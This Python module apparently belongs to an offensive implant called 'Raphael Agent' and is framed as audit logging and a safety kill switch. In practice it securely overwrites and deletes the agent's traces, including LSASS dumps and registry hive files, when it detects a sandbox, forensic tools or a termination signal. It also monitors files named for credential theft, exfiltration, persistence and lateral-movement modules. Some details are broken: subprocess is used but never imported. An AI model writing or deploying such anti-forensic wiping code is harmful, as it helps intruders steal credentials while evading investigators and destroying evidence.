"""
Audit Logging and Kill Switch for Raphael Agent

Provides:
- Structured audit logging (JSON lines) for all agent operations
- Kill switch for immediate agent termination and artifact wiping
- Integrity monitoring for critical files
- Forensic artifact collection on trigger
"""

import atexit
import hashlib
import json
import logging
import os
import platform
import shutil
import signal
import sys
import tempfile
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum, auto
from pathlib import Path
from typing import Any, Optional

logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════════════════════════
# KILL SWITCH
# ═══════════════════════════════════════════════════════════════════════════════

class KillSwitch:
    """
    Emergency agent termination and artifact sanitization.

    Triggered by:
    - Explicit operator command
    - Detection of analysis/sandbox environment
    - Integrity check failure
    - Explicit timer expiry (dead man's switch)

    Actions:
    1. Stop all background tasks
    2. Securely delete agent artifacts
    3. Wipe sensitive memory (best effort)
    4. Terminate process
    """

    class TriggerReason(str, Enum):
        OPERATOR_COMMAND = "operator_command"
        SANDBOX_DETECTED = "sandbox_detected"
        INTEGRITY_FAILURE = "integrity_failure"
        DEAD_MAN_SWITCH = "dead_man_switch"
        FORENSIC_TOOLS_DETECTED = "forensic_tools_detected"

    def __init__(
        self,
        agent_dir: str | Path,
        artifact_paths: list[str] | None = None,
        log_path: str | Path = "/var/log/agent/kill_switch.log",
    ):
        self._agent_dir = Path(agent_dir).resolve()
        self._artifact_paths = artifact_paths or self._default_artifacts()
        self._log_path = Path(log_path)
        self._triggered = False
        self._lock = threading.Lock()
        self._dead_man_timer: Optional[threading.Timer] = None
        self._callbacks: list[Callable] = []

        # Register signal handlers
        self._register_signals()

        # Register atexit handler
        atexit.register(self._cleanup_on_exit)

        self._log_path.parent.mkdir(parents=True, exist_ok=True)

    def _default_artifacts(self) -> list[str]:
        """Default artifact paths to wipe on kill switch."""
        base = self._agent_dir
        return [
            str(base / "agent.db"),
            str(base / "session.key"),
            str(base / "agent.log"),
            str(base / "config.yaml"),
            str(base / "keys" / "*"),
            str(base / "staging" / "*"),
            str(base / "cache" / "*"),
            "/tmp/.raphael_*",
            "/tmp/lsass_*.dmp",
            "/tmp/*.hive",
            "/tmp/raphael_*",
        ]

    def _register_signals(self):
        """Register signal handlers for graceful shutdown."""
        signal.signal(signal.SIGTERM, self._signal_handler)
        signal.signal(signal.SIGINT, self._signal_handler)
        if hasattr(signal, "SIGQUIT"):
            signal.signal(signal.SIGQUIT, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """Handle termination signals."""
        logger.warning("Received signal %s — triggering kill switch", signum)
        self.trigger(KillSwitch.TriggerReason.OPERATOR_COMMAND)

    def _cleanup_on_exit(self):
        """Cleanup on normal exit (does NOT wipe artifacts)."""
        if self._dead_man_timer:
            self._dead_man_timer.cancel()

    def add_callback(self, callback: Callable):
        """Add a cleanup callback to run before termination."""
        self._callbacks.append(callback)

    def trigger(self, reason: TriggerReason):
        """Trigger the kill switch."""
        with self._lock:
            if self._triggered:
                logger.warning("Kill switch already triggered, ignoring duplicate")
                return

            self._triggered = True
            logger.critical("KILL SWITCH TRIGGERED: %s", reason.value)

            # Cancel dead man's switch timer
            if self._dead_man_timer:
                self._dead_man_timer.cancel()
                self._dead_man_timer = None

            # Run callbacks first
            for callback in self._callbacks:
                try:
                    callback(reason)
                except Exception as e:
                    logger.error("Kill switch callback failed: %s", e)

            # Execute wipe
            self._wipe_artifacts(reason)

            # Log the event
            self._log_trigger(reason)

            # Terminate process
            os._exit(0)

    def _wipe_artifacts(self, reason: TriggerReason):
        """Securely wipe all tracked artifacts."""
        wiped = 0
        failed = 0

        for pattern in self._artifact_paths:
            if "*" in pattern:
                import glob
                paths = glob.glob(pattern)
            else:
                paths = [pattern]

            for path_str in paths:
                path = Path(path_str)
                try:
                    if path.is_file():
                        self._secure_delete(path)
                        wiped += 1
                    elif path.is_dir():
                        self._secure_rmtree(path)
                        wiped += 1
                except Exception as e:
                    failed += 1
                    logger.error("Failed to wipe %s: %s", path, e)

        logger.critical(
            "Kill switch wipe complete: wiped=%d, failed=%d, reason=%s",
            wiped, failed, reason.value,
        )

    def _secure_delete(self, path: Path, passes: int = 3):
        """Overwrite file with random data before deleting."""
        if not path.exists():
            return

        try:
            size = path.stat().st_size
            with open(path, "wb") as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
            path.unlink()
        except (PermissionError, OSError):
            # Fallback to simple delete
            path.unlink(missing_ok=True)

    def _secure_rmtree(self, path: Path):
        """Recursively delete directory with secure file deletion."""
        if not path.exists():
            return

        for item in path.rglob("*"):
            if item.is_file():
                self._secure_delete(item)

        shutil.rmtree(path, ignore_errors=True)

    def _log_trigger(self, reason: TriggerReason):
        """Log kill switch trigger to persistent log."""
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "kill_switch_triggered",
            "reason": reason.value,
            "pid": os.getpid(),
            "agent_dir": str(self._agent_dir),
        }
        try:
            with open(self._log_path, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception:
            pass

    def start_dead_man_switch(self, interval_seconds: int = 3600):
        """
        Start a dead man's switch timer.

        If the timer is not reset within interval_seconds, the kill
        switch triggers automatically.
        """
        if self._dead_man_timer:
            self._dead_man_timer.cancel()

        self._dead_man_timer = threading.Timer(
            interval_seconds,
            lambda: self.trigger(KillSwitch.TriggerReason.DEAD_MAN_SWITCH),
        )
        self._dead_man_timer.daemon = True
        self._dead_man_timer.start()
        logger.info("Dead man's switch started: %ds", interval_seconds)

    def reset_dead_man_switch(self):
        """Reset the dead man's switch timer."""
        if self._dead_man_timer:
            self._dead_man_timer.cancel()
            self.start_dead_man_switch()


# ═══════════════════════════════════════════════════════════════════════════════
# AUDIT LOGGING
# ═══════════════════════════════════════════════════════════════════════════════

class AuditEventType(str, Enum):
    """Types of audit events."""
    AGENT_START = "agent_start"
    AGENT_STOP = "agent_stop"
    TASK_RECEIVED = "task_received"
    TASK_EXECUTED = "task_executed"
    TASK_FAILED = "task_failed"
    COMMAND_EXECUTED = "command_executed"
    FILE_READ = "file_read"
    FILE_WRITTEN = "file_written"
    NETWORK_CONNECT = "network_connect"
    CREDENTIAL_ACCESS = "credential_access"
    PERSISTENCE_INSTALLED = "persistence_installed"
    LATERAL_MOVE = "lateral_move"
    EXFILTRATION = "exfiltration"
    KILL_SWITCH = "kill_switch"
    INTEGRITY_CHECK = "integrity_check"
    SANDBOX_DETECTED = "sandbox_detected"


@dataclass
class AuditEntry:
    """Structured audit log entry."""
    timestamp: str
    event_type: str
    agent_id: str
    session_id: str
    user: str
    command: str
    args: list[str]
    result: str
    exit_code: int
    duration_ms: float
    source_ip: str
    details: dict[str, Any] = field(default_factory=dict)

    def to_json(self) -> str:
        return json.dumps(self.__dict__, default=str)


class AuditLogger:
    """
    Structured audit logging for all agent operations.

    Features:
    - JSON Lines format for easy parsing
    - Local file + optional remote forwarding
    - Automatic log rotation
    - Integrity verification (hash chain)
    """

    def __init__(
        self,
        log_path: str | Path = "/var/log/agent/audit.log",
        max_size_mb: int = 100,
        max_files: int = 10,
        remote_forwarder: Optional[Callable[[dict], None]] = None,
    ):
        self._log_path = Path(log_path)
        self._max_size = max_size_mb * 1024 * 1024
        self._max_files = max_files
        self._remote_forwarder = remote_forwarder
        self._hash_chain: list[str] = []  # SHA-256 chain for integrity
        self._lock = threading.Lock()

        self._log_path.parent.mkdir(parents=True, exist_ok=True)
        self._rotate_if_needed()

        logger.info("Audit logger initialized: %s", self._log_path)

    def _rotate_if_needed(self):
        """Rotate log file if it exceeds max size."""
        if self._log_path.exists() and self._log_path.stat().st_size > self._max_size:
            for i in range(self._max_files - 1, 0, -1):
                old = self._log_path.with_suffix(f".{i}")
                new = self._log_path.with_suffix(f".{i + 1}")
                if old.exists():
                    if new.exists():
                        new.unlink()
                    old.rename(new)

            if self._log_path.exists():
                self._log_path.rename(self._log_path.with_suffix(".1"))

    def log(
        self,
        event_type: AuditEventType | str,
        agent_id: str,
        session_id: str,
        user: str = "",
        command: str = "",
        args: list[str] | None = None,
        result: str = "success",
        exit_code: int = 0,
        duration_ms: float = 0.0,
        source_ip: str = "127.0.0.1",
        details: dict[str, Any] | None = None,
    ):
        """Write an audit entry."""
        entry = AuditEntry(
            timestamp=datetime.now(timezone.utc).isoformat(),
            event_type=(
                event_type.value if isinstance(event_type, AuditEventType)
                else str(event_type)
            ),
            agent_id=agent_id,
            session_id=session_id,
            user=user,
            command=command,
            args=args or [],
            result=result,
            exit_code=exit_code,
            duration_ms=duration_ms,
            source_ip=source_ip,
            details=details or {},
        )

        self._write_entry(entry)

    def _write_entry(self, entry: AuditEntry):
        """Write entry to log file with hash chaining."""
        json_line = entry.to_json()

        # Compute hash chain
        with self._lock:
            prev_hash = self._hash_chain[-1] if self._hash_chain else "0" * 64
            current_hash = hashlib.sha256(
                (prev_hash + json_line).encode()
            ).hexdigest()
            self._hash_chain.append(current_hash)

            # Write with hash prefix for integrity verification
            log_line = f"{current_hash[:16]} {json_line}\n"

            try:
                with open(self._log_path, "a") as f:
                    f.write(log_line)
            except Exception as e:
                logger.error("Failed to write audit log: %s", e)

            # Forward to remote if configured
            if self._remote_forwarder:
                try:
                    self._remote_forwarder({
                        **entry.__dict__,
                        "hash_chain": current_hash,
                    })
                except Exception:
                    pass

    def verify_integrity(self) -> tuple[bool, list[str]]:
        """
        Verify the integrity of the audit log using the hash chain.

        Returns (is_valid, list_of_corrupted_lines).
        """
        if not self._log_path.exists():
            return True, []

        corrupted = []
        prev_hash = "0" * 64

        try:
            with open(self._log_path) as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line:
                        continue

                    # Extract hash and JSON
                    parts = line.split(" ", 1)
                    if len(parts) != 2:
                        corrupted.append(f"line_{line_num}: malformed")
                        continue

                    stored_hash, json_part = parts
                    computed_hash = hashlib.sha256(
                        (prev_hash + json_part).encode()
                    ).hexdigest()

                    if computed_hash[:16] != stored_hash:
                        corrupted.append(f"line_{line_num}: hash mismatch")

                    prev_hash = computed_hash

        except Exception as e:
            corrupted.append(f"verification error: {e}")

        return len(corrupted) == 0, corrupted


# ═══════════════════════════════════════════════════════════════════════════════
# INTEGRITY MONITORING
# ═══════════════════════════════════════════════════════════════════════════════

class IntegrityMonitor:
    """
    Monitors critical agent files for unauthorized modification.

    Uses SHA-256 hashes stored in a protected manifest.
    """

    def __init__(
        self,
        agent_dir: str | Path,
        manifest_path: str | Path | None = None,
    ):
        self._agent_dir = Path(agent_dir).resolve()
        self._manifest_path = (
            Path(manifest_path)
            if manifest_path
            else self._agent_dir / ".integrity_manifest.json"
        )
        self._manifest: dict[str, str] = {}
        self._load_manifest()

    def _load_manifest(self):
        """Load the integrity manifest."""
        if self._manifest_path.exists():
            try:
                with open(self._manifest_path) as f:
                    self._manifest = json.load(f)
            except Exception:
                self._manifest = {}
        else:
            self._manifest = {}

    def _save_manifest(self):
        """Save the manifest atomically."""
        tmp = self._manifest_path.with_suffix(".tmp")
        try:
            with open(tmp, "w") as f:
                json.dump(self._manifest, f, indent=2)
            tmp.rename(self._manifest_path)
        except Exception as e:
            logger.error("Failed to save integrity manifest: %s", e)

    def _hash_file(self, path: Path) -> str:
        """Compute SHA-256 hash of a file."""
        h = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                h.update(chunk)
        return h.hexdigest()

    def add_file(self, path: str | Path):
        """Add a file to the integrity manifest."""
        path = Path(path)
        if not path.is_absolute():
            path = self._agent_dir / path

        if path.exists():
            self._manifest[str(path)] = self._hash_file(path)
            self._save_manifest()

    def remove_file(self, path: str | Path):
        """Remove a file from the manifest."""
        path = str(path)
        self._manifest.pop(path, None)
        self._save_manifest()

    def verify_all(self) -> tuple[bool, list[tuple[str, str]]]:
        """
        Verify all files in the manifest.

        Returns (all_ok, list_of_violations) where violations are
        (path, violation_type) tuples.
        """
        violations = []

        for path_str, expected_hash in self._manifest.items():
            path = Path(path_str)
            if not path.exists():
                violations.append((path_str, "missing"))
                continue

            try:
                actual_hash = self._hash_file(path)
                if actual_hash != expected_hash:
                    violations.append((path_str, "modified"))
            except Exception as e:
                violations.append((path_str, f"error: {e}"))

        return len(violations) == 0, violations

    def verify_file(self, path: str | Path) -> tuple[bool, str]:
        """Verify a single file."""
        path = Path(path)
        path_str = str(path)

        if path_str not in self._manifest:
            return False, "not_in_manifest"

        if not path.exists():
            return False, "missing"

        actual_hash = self._hash_file(path)
        if actual_hash != self._manifest[path_str]:
            return False, "modified"

        return True, "ok"


# ═══════════════════════════════════════════════════════════════════════════════
# FORENSIC ARTIFACT COLLECTION
# ═══════════════════════════════════════════════════════════════════════════════

class ForensicCollector:
    """
    Collects forensic artifacts on trigger for post-incident analysis.

    Runs in a separate thread to avoid blocking the agent.
    """

    def __init__(
        self,
        output_dir: str | Path = "/tmp/raphael_forensic",
        max_size_mb: int = 500,
    ):
        self._output_dir = Path(output_dir)
        self._max_size = max_size_mb * 1024 * 1024
        self._output_dir.mkdir(parents=True, exist_ok=True)
        self._collected = 0

    def collect_all(self, trigger_reason: str = "manual") -> Path:
        """
        Collect all forensic artifacts.

        Returns the path to the collection directory.
        """
        collection_id = f"forensic_{trigger_reason}_{int(time.time())}"
        collection_dir = self._output_dir / collection_id
        collection_dir.mkdir(parents=True, exist_ok=True)

        self._collected = 0

        # 1. Process memory (best effort)
        self._collect_process_memory(collection_dir)

        # 2. Network connections
        self._collect_network_connections(collection_dir)

        # 3. Open files
        self._collect_open_files(collection_dir)

        # 4. Environment
        self._collect_environment(collection_dir)

        # 5. Logs
        self._collect_logs(collection_dir)

        # 6. Create manifest
        manifest = self._create_manifest(collection_dir, trigger_reason)
        manifest_path = collection_dir / "MANIFEST.json"
        manifest_path.write_text(json.dumps(manifest, indent=2))

        logger.info(
            "Forensic collection complete: %s (%d artifacts)",
            collection_dir, self._collected,
        )
        return collection_dir

    def _collect_process_memory(self, output_dir: Path):
        """Attempt to dump process memory (Linux only)."""
        if platform.system() != "Linux":
            return

        try:
            pid = os.getpid()
            mem_path = output_dir / "process_memory.bin"

            # Try /proc/pid/mem (requires ptrace scope or root)
            with open(f"/proc/{pid}/mem", "rb") as src:
                with open(mem_path, "wb") as dst:
                    shutil.copyfileobj(src, dst, length=8192)

            self._collected += 1
        except Exception:
            pass

    def _collect_network_connections(self, output_dir: Path):
        """Collect network connection info."""
        net_path = output_dir / "network_connections.json"
        connections = []

        try:
            import psutil
            for conn in psutil.net_connections(kind="inet"):
                connections.append({
                    "fd": conn.fd,
                    "family": conn.family.name,
                    "type": conn.type.name,
                    "laddr": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                    "raddr": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                    "status": conn.status,
                    "pid": conn.pid,
                })
        except Exception:
            # Fallback to netstat
            try:
                result = subprocess.run(
                    ["netstat", "-tunap"],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                connections.append({"netstat_output": result.stdout})
            except Exception:
                pass

        net_path.write_text(json.dumps(connections, indent=2))
        self._collected += 1

    def _collect_open_files(self, output_dir: Path):
        """Collect open file descriptors."""
        files_path = output_dir / "open_files.json"
        files = []

        try:
            import psutil
            proc = psutil.Process(os.getpid())
            for f in proc.open_files():
                files.append({
                    "fd": f.fd,
                    "path": f.path,
                    "mode": f.mode,
                })
        except Exception:
            pass

        files_path.write_text(json.dumps(files, indent=2))
        self._collected += 1

    def _collect_environment(self, output_dir: Path):
        """Collect environment variables (sanitized)."""
        env_path = output_dir / "environment.json"
        sanitized = {}

        secret_patterns = [
            "TOKEN", "SECRET", "PASSWORD", "PASS", "API_KEY", "APIKEY",
            "ACCESS_KEY", "SECRET_KEY", "AUTH", "CREDENTIAL", "KEY",
            "PRIVATE", "CERT", "SSH", "BEARER",
        ]

        for key, value in os.environ.items():
            is_secret = any(p.lower() in key.lower() for p in secret_patterns)
            if is_secret:
                sanitized[key] = "[REDACTED]"
            else:
                sanitized[key] = value

        env_path.write_text(json.dumps(sanitized, indent=2))
        self._collected += 1

    def _collect_logs(self, output_dir: Path):
        """Collect recent logs."""
        logs_path = output_dir / "agent_logs.json"
        logs = []

        # Try to find agent log files
        log_dirs = [
            Path("/var/log"),
            Path("/tmp"),
            Path.home() / ".local" / "share" / "raphael",
        ]

        for log_dir in log_dirs:
            if log_dir.exists():
                for log_file in log_dir.glob("*raphael*.log"):
                    try:
                        content = log_file.read_text()[-10000:]  # Last 10KB
                        logs.append({
                            "file": str(log_file),
                            "content": content,
                        })
                        self._collected += 1
                    except Exception:
                        pass

        logs_path.write_text(json.dumps(logs, indent=2))
        self._collected += 1

    def _create_manifest(self, output_dir: Path, reason: str) -> dict:
        """Create collection manifest."""
        return {
            "collection_id": output_dir.name,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "trigger_reason": reason,
            "agent_pid": os.getpid(),
            "platform": platform.platform(),
            "python_version": sys.version,
            "artifacts_collected": self._collected,
            "total_size_bytes": sum(
                f.stat().st_size for f in output_dir.rglob("*") if f.is_file()
            ),
        }


# ═══════════════════════════════════════════════════════════════════════════════
# INTEGRATION
# ═══════════════════════════════════════════════════════════════════════════════

def setup_agent_safety(
    agent_id: str,
    session_id: str,
    agent_dir: str | Path,
    kill_switch_interval: int = 3600,
) -> tuple[KillSwitch, AuditLogger, IntegrityMonitor, ForensicCollector]:
    """
    Set up all safety components for the agent.

    Returns (kill_switch, audit_logger, integrity_monitor, forensic_collector).
    """
    agent_dir = Path(agent_dir).resolve()

    # Kill switch
    kill_switch = KillSwitch(agent_dir)
    kill_switch.start_dead_man_switch(kill_switch_interval)

    # Audit logger
    audit_logger = AuditLogger()

    # Integrity monitor
    integrity_monitor = IntegrityMonitor(agent_dir)
    # Add critical files to monitor
    for critical_file in [
        "agent.py",
        "crypto.py",
        "modules/persistence.py",
        "modules/lateral.py",
        "modules/credtheft.py",
        "modules/exfil.py",
        "stealth.py",
    ]:
        integrity_monitor.add_file(agent_dir / critical_file)

    # Forensic collector
    forensic_collector = ForensicCollector()

    # Register kill switch callback for forensic collection
    def on_kill(reason):
        logger.critical("Kill switch triggered: %s — collecting forensics", reason)
        forensic_collector.collect_all(reason.value)

    kill_switch.add_callback(on_kill)

    # Log agent start
    audit_logger.log(
        event_type=AuditEventType.AGENT_START,
        agent_id=agent_id,
        session_id=session_id,
        command="agent_start",
        result="success",
    )

    return kill_switch, audit_logger, integrity_monitor, forensic_collector